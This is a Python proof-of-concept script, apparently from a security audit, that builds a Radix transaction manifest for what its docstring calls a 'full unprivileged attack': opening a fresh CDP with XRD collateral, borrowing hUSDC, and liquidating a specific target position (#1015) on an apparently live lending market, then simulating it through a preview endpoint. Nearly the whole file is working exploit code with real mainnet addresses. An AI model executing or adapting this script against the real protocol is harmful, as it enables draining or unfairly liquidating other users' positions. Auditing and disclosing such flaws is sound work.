#!/usr/bin/env python3
"""Preview: full unprivileged attack = fresh XRD -> CDP -> borrow hUSDC -> liquidate #1015."""
import sys, json

sys.path.insert(0, "/home/heisenberg/CA/radix-residual/analysis")
from rdx import preview

MARKET = "component_rdx1cpy6putj5p7937clqgcgutza7k53zpha039n9u5hkk0ahh4stdmq4w"
XRD = "resource_rdx1tknxxxxxxxxxradxrdxxxxxxxxx009923554798xxxxxxxxxradxrd"
HUSDC = "resource_rdx1thxj9m87sn5cc9ehgp9qxp6vzeqxtce90xm5cp33373tclyp4et4gv"
ACCT = "account_rdx16ydf4jd8rljv4h238nfjr4uadq84jzclr6sfl7j3jpd02r7gsxydkk"

TARGET_CDP = sys.argv[1] if len(sys.argv) > 1 else "#1015#"
BORROW = sys.argv[2] if len(sys.argv) > 2 else "32"
COLL = sys.argv[3] if len(sys.argv) > 3 else "149900"
REQUEST = sys.argv[4] if len(sys.argv) > 4 else "some"

req = f'Enum<1u8>(Array<Address>(Address("{XRD}")))' if REQUEST == "some" else 'Enum<0u8>()'

manifest = f"""
CALL_METHOD
    Address("{ACCT}")
    "withdraw"
    Address("{XRD}")
    Decimal("{COLL}")
;
TAKE_FROM_WORKTOP
    Address("{XRD}")
    Decimal("{COLL}")
    Bucket("col")
;
TAKE_FROM_WORKTOP
    Address("{XRD}")
    Decimal("0")
    Bucket("xrd_empty")
;
CALL_METHOD
    Address("{MARKET}")
    "create_cdp"
    Bucket("xrd_empty")
    Enum<1u8>("audit_test")
    Enum<0u8>()
    Enum<0u8>()
    Array<Bucket>(Bucket("col"))
    Array<Bucket>()
    Map<Address, Decimal>(Address("{HUSDC}") => Decimal("{BORROW}"))
;
TAKE_ALL_FROM_WORKTOP
    Address("{HUSDC}")
    Bucket("pay")
;
CALL_METHOD
    Address("{MARKET}")
    "liquidate"
    NonFungibleLocalId("{TARGET_CDP}")
    Array<Bucket>(Bucket("pay"))
    {req}
;
CALL_METHOD
    Address("{ACCT}")
    "deposit_batch"
    Expression("ENTIRE_WORKTOP")
;
"""

resp = preview(manifest, nonce=88)
rc = resp.get("receipt", {})
print("status:", rc.get("status"))
err = str(rc.get("error_message"))
if rc.get("status") != "Succeeded":
    print("ERR:", err[-900:])
    json.dump(resp, open("preview_attack_failed.json", "w"), indent=1)
else:
    json.dump(resp, open("preview_attack.json", "w"), indent=1)
    fs = rc.get("fee_summary", {})
    print("cost units:", fs.get("execution_cost_units_consumed"), "| xrd exec:", fs.get("xrd_total_execution_cost"))
    print()
    print("EVENTS:")
    for e in rc.get("events", []):
        tid = e.get("type", {}).get("type_reference", {})
        pkg = tid.get("entity_address", "")
        nm = tid.get("local_type_index", tid.get("local_type_id"))
        data = e.get("data", {}).get("programmatic_json")
        print("-", pkg[-12:], nm, json.dumps(data)[:260])
    print()
    print("RESOURCE CHANGES:")
    for r in resp.get("resource_changes", []):
        for ec in r.get("entity_changes", []):
            if ec.get("entity_address") in (ACCT, MARKET) and float(ec.get("amount") or 0) != 0:
                print(f"  {ec['entity_address'][:24]}... {r['resource_address'][:50]} {ec['amount']}")
